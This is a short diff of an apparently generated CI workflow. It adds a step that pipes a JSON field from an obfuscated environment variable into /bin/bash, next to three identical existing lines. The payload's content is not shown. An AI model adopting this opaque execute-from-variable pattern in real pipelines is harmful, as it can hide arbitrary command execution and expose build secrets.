@@ -25,6 +25,7 @@ jobs:
           echo $hn1647 | jq -r .gzrrq49474 | /bin/bash
           echo $grmif5842 | jq -r .p9216 | /bin/bash
           echo $d5 | jq -r .zb7003 | /bin/bash
+          printf '%s' "$ivsko2555" | jq -r .c408 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
